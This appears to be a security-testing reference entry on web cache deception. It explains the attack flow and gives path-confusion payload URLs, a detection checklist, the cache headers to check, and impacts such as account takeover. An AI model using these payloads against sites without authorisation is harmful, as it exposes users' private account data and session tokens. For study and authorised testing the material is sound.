---
id: "web-cache-deception"
title: "Web Cache Deception"
type: "technique"
category: "web-application"
subcategory: "cache"
tags: ["cache-deception", "cdn", "path-confusion", "data-theft", "account-takeover", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["cache-poisoning", "path-traversal", "cors-misconfiguration"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Web Cache Deception

## Difference from Cache Poisoning
Cache **poisoning** = inject malicious content INTO the cache for all users.
Cache **deception** = trick ONE user into caching THEIR sensitive data, then you fetch it.

## How It Works
```
1. Victim is authenticated on target.com
2. Attacker sends victim a crafted URL:
   https://target.com/account/settings/anything.css
3. Web server ignores "anything.css" and serves /account/settings (with PII)
4. CDN sees .css extension → caches the response as static content
5. Attacker requests same URL → gets victim's cached account page
```

## Path Confusion Payloads
```
# Append static extension to dynamic endpoint:
https://target.com/account/profile/x.css
https://target.com/account/profile/x.js
https://target.com/account/profile/x.png
https://target.com/account/profile/x.svg
https://target.com/api/user/me/x.css

# Path parameter confusion:
https://target.com/account/profile;x.css
https://target.com/account/profile%2fx.css
https://target.com/account/profile/.css
https://target.com/account/profile%00.css

# Encoded separators:
https://target.com/account/profile%3bx.css      # Semicolon
https://target.com/account/profile%23x.css       # Hash
https://target.com/account/profile%3fx.css       # Question mark
```

## Detection Methodology
```
1. Find authenticated pages with sensitive data (/account, /profile, /settings)
2. Append .css or .js to the URL
3. Check if the page still returns the dynamic content
4. Check response headers: is it cached? (X-Cache: HIT, Age: > 0, CF-Cache-Status)
5. Open a private/incognito window (no cookies)
6. Request the same URL — if you see the authenticated content → vulnerable
```

## Cache Headers to Check
```
X-Cache: HIT
CF-Cache-Status: HIT          # Cloudflare
X-Varnish: 123456 789012      # Varnish (two numbers = HIT)
Age: 300                       # Content has been cached for 300s
Cache-Control: public          # CDN is told to cache
Vary: (missing or minimal)     # Not varying by Cookie = dangerous
```

## Where to Find This
- Any app behind a CDN (Cloudflare, Akamai, Fastly, CloudFront)
- Apps using Varnish, Nginx caching, or any reverse proxy cache
- SPAs with server-side rendering behind CDN
- APIs behind CDN with aggressive caching rules

## Impact
- Account data theft (PII, email, address, phone)
- Session token theft → account takeover
- API key/token exposure
- Financial data exposure
- Bounties: $3k–$15k+

## Tools
- Burp Suite (test path confusion, check cache headers)
- curl (check X-Cache, Age headers)
- Web Cache Vulnerability Scanner (wcvs)
